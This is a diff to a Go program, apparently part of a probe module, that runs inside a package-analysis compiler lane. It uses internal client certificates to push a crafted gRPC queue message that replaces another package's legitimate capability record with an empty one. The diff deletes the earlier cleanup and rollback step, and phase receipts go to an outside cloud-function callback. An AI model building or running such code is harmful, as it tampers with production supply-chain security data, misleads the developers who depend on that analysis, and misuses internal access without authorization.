@@ -1,7 +1,7 @@
-// Command queue-roundtrip performs one mutation and one cleanup against a
-// fresh researcher-owned package-analysis record from the exact production
-// Capslock compiler lane. Every action and public transition is pinned and
-// emitted as a bounded receipt to one pinned callback.
+// Command queue-roundtrip suppresses the legitimate capability record of one
+// researcher-owned package from a different researcher-owned package in the
+// exact production Capslock compiler lane. The internal action and public
+// transition are pinned and emitted as bounded receipts to one callback.
 package main
 
 import (
@@ -35,33 +35,24 @@ var callbackURLSHA256 string
 
 const (
 	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion     = "v0.0.124-codex"
-	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.124-codex"
-	expectedAgent    = "go-cgo-pkgsite-probe-v124-owned-roundtrip"
+	probeVersion     = "v0.0.127-capability-suppress-codex"
+	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.127-capability-suppress-codex"
+	expectedAgent    = "go-cgo-pkgsite-probe-v127-capability-suppress"
 	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.8"
 	queueName        = "capslock-capability-result"
-	mutationSource   = "robert-owned-v124-structured-mutation"
-	cleanupSource    = "robert-owned-v124-clean-rollback"
+	mutationSource   = "robert-owned-v127-capability-suppression"
 	queueMethod      = "/sos.queue.Queue/Push"
 	serviceHost      = "talisman-core.default.svc.cluster.local"
 	servicePort      = 9000
 	tlsServerName    = "localhost"
 
-	analysisURL   = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.8/analysis"
-	cleanSHA256   = "14d798f2aadfed6f6a1eb6951221daa65d5e132d402cf9fa35952c0adc9857dd"
-	mutatedSHA256 = "0000000000000000000000000000000000000000000000000000000000000000"
-
-	// v125 proved that CapabilityResultAction.capabilities is a repeated
-	// CapabilitiesEntry whose key is field 1/string and value is field 2/bytes.
-	// The meaning and serialization of the opaque value bytes remain unproved,
-	// so these stay empty until the owned v126 Result receipt supplies them.
-	// validateStaticPins prevents any callback or RPC before then.
-	mutationCapabilityKey      = ""
-	mutationCapabilityValueHex = ""
-	mutationPushBytes          = 0
-	mutationPushSHA256         = "0000000000000000000000000000000000000000000000000000000000000000"
-	cleanupPushBytes           = 136
-	cleanupPushSHA256          = "225fccc94424f1226bb7915a24d71229e09ac4a8e268f22892ffe7b6a0801874"
+	analysisURL = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.8/analysis"
+	// cleanSHA256 is intentionally locked until production has returned the
+	// immutable v0.0.8 module's legitimate non-empty record for 21 samples.
+	cleanSHA256        = "0000000000000000000000000000000000000000000000000000000000000000"
+	mutatedSHA256      = "14d798f2aadfed6f6a1eb6951221daa65d5e132d402cf9fa35952c0adc9857dd"
+	mutationPushBytes  = 144
+	mutationPushSHA256 = "23514124b033afbbaedcf2777a839cd3adf9135aaf919d420eea79f9439f3873"
 
 	clientCertificatePath = "/etc/tls/client/tls.crt"
 	clientKeyPath         = "/etc/tls/client/tls.key"
@@ -190,10 +181,6 @@ type report struct {
 	MutationPublic           convergenceReceipt `json:"mutation_public"`
 	MutationPublicSHA256     string             `json:"mutation_public_report_sha256,omitempty"`
 	MutationPublicCallbackOK bool               `json:"mutation_public_callback_ok"`
-	Cleanup                  queueReceipt       `json:"cleanup"`
-	CleanupReportSHA256      string             `json:"cleanup_report_sha256,omitempty"`
-	CleanupCallbackOK        bool               `json:"cleanup_callback_ok"`
-	CleanupPublic            convergenceReceipt `json:"cleanup_public"`
 	Outcome                  string             `json:"outcome"`
 	Error                    string             `json:"error,omitempty"`
 }
@@ -221,13 +208,13 @@ func main() {
 
 	started := time.Now()
 	receipt := report{
-		Schema: "owned-queue-roundtrip/v1", Phase: "final", Module: moduleName,
+		Schema: "owned-capability-suppression/v1", Phase: "final", Module: moduleName,
 		Version: probeVersion, Target: targetCoordinate,
 		ExpectedMutatedSHA256: mutatedSHA256, ExpectedCleanSHA256: cleanSHA256,
 		StartedUTC: started.UTC().Format(time.RFC3339Nano),
 		Identity:   inspectIdentity(origin), Precheck: []publicSample{},
-		Mutation: emptyQueueReceipt(mutationSource), Cleanup: emptyQueueReceipt(cleanupSource),
-		MutationPublic: emptyConvergenceReceipt("mutated"), CleanupPublic: emptyConvergenceReceipt("clean"),
+		Mutation:       emptyQueueReceipt(mutationSource),
+		MutationPublic: emptyConvergenceReceipt("mutated"),
 	}
 
 	certIdentity, certErr := readClientCertificateIdentity()
@@ -282,24 +269,11 @@ func main() {
 	receipt.MutationPublicSHA256, err = submitPhase("mutation_public", mutationPublicReport)
 	receipt.MutationPublicCallbackOK = err == nil
 
-	cleanupBody := buildCleanPush()
-	receipt.Cleanup = runQueuePush(cleanupBody, cleanupSource, cleanupPushBytes, cleanupPushSHA256)
-	cleanupReport := receipt
-	cleanupReport.Phase = "cleanup_queue"
-	cleanupReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	receipt.CleanupReportSHA256, err = submitPhase("cleanup_queue", cleanupReport)
-	receipt.CleanupCallbackOK = err == nil
-	receipt.CleanupPublic = runConvergence("clean", precheckSamples+receipt.MutationPublic.TotalSamples)
-
-	if receipt.Mutation.Verified && receipt.MutationCallbackOK && receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK &&
-		receipt.Cleanup.Verified && receipt.CleanupCallbackOK && receipt.CleanupPublic.Converged {
-		receipt.Outcome = "owned_roundtrip_verified_and_clean_restored"
-	} else if receipt.CleanupPublic.Converged {
-		receipt.Outcome = "clean_restored_roundtrip_receipt_incomplete"
-		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error, receipt.Cleanup.Error)
+	if receipt.Mutation.Verified && receipt.MutationCallbackOK && receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK {
+		receipt.Outcome = "owned_capability_suppression_verified"
 	} else {
-		receipt.Outcome = "cleanup_not_converged"
-		receipt.Error = firstNonempty(receipt.Cleanup.Error, receipt.CleanupPublic.Error, receipt.Mutation.Error, receipt.MutationPublic.Error)
+		receipt.Outcome = "capability_suppression_not_verified"
+		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error)
 	}
 	finishAndSubmit(&receipt)
 }
@@ -342,15 +316,12 @@ func validNonce(value string) bool {
 func validateStaticPins() error {
 	zero := strings.Repeat("0", 64)
 	if cleanSHA256 == zero || mutatedSHA256 == zero || cleanSHA256 == mutatedSHA256 ||
-		mutationPushBytes <= 0 || mutationPushSHA256 == zero || cleanupPushBytes <= 0 || cleanupPushSHA256 == zero {
-		return errors.New("roundtrip descriptor pins incomplete")
+		mutationPushBytes <= 0 || mutationPushSHA256 == zero {
+		return errors.New("suppression pins incomplete")
 	}
 	mutation, err := buildMutationPush()
 	if err != nil || !matchesRequestPin(mutation, mutationPushBytes, mutationPushSHA256) {
 		return errors.New("mutation request pin mismatch")
-	}
-	if !matchesRequestPin(buildCleanPush(), cleanupPushBytes, cleanupPushSHA256) {
-		return errors.New("cleanup request pin mismatch")
 	}
 	return nil
 }
@@ -365,7 +336,7 @@ func validateRuntimeConfiguration() error {
 		return errors.New("invalid callback identity")
 	}
 	parsed, err := url.Parse(callbackBaseURL)
-	expectedPath := "/go-cgo-v124-roundtrip-codex/v1/session/" + callbackSession
+	expectedPath := "/go-cgo-v127-suppression-codex/v1/session/" + callbackSession
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
 		parsed.Path != expectedPath {
@@ -516,7 +487,7 @@ func fetchPublic(sequence int) (publicSample, error) {
 	result := publicSample{Sequence: sequence, ObservedUTC: time.Now().UTC().Format(time.RFC3339Nano), State: "unknown"}
 	parsed, _ := url.Parse(analysisURL)
 	query := parsed.Query()
-	query.Set("v124_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
+	query.Set("v127_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
 	parsed.RawQuery = query.Encode()
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
@@ -593,22 +564,11 @@ func grpcFrame(payload []byte) []byte {
 	return append(frame, payload...)
 }
 
-func buildCleanPush() []byte {
-	cleanAction := appendStringField(nil, 1, targetCoordinate)
-	return buildQueuePush(cleanupSource, cleanAction)
-}
-
 func buildMutationPush() ([]byte, error) {
-	if mutationCapabilityKey == "" || mutationCapabilityValueHex == "" {
-		return nil, errors.New("mutation capability value not pinned")
-	}
-	value, err := hex.DecodeString(mutationCapabilityValueHex)
-	if err != nil || len(value) == 0 {
-		return nil, errors.New("mutation capability value invalid")
-	}
-	action, err := encodeCapabilityResultAction(targetCoordinate, []capabilityMapEntry{{
-		Key: mutationCapabilityKey, Value: value,
-	}}, "")
+	// A field-1-only CapabilityResultAction is the exact clean result shape
+	// already accepted by production in v121. Here it has a visible effect:
+	// it replaces B's legitimate non-empty record with an empty one.
+	action, err := encodeCapabilityResultAction(targetCoordinate, nil, "")
 	if err != nil {
 		return nil, err
 	}
@@ -828,7 +788,7 @@ func verifyInternalPeer(state tls.ConnectionState, roots *x509.CertPool) error {
 
 func validCallbackPhase(phase string) bool {
 	switch phase {
-	case "preflight", "mutation_queue", "mutation_public", "cleanup_queue", "final":
+	case "preflight", "mutation_queue", "mutation_public", "final":
 		return true
 	default:
 		return false
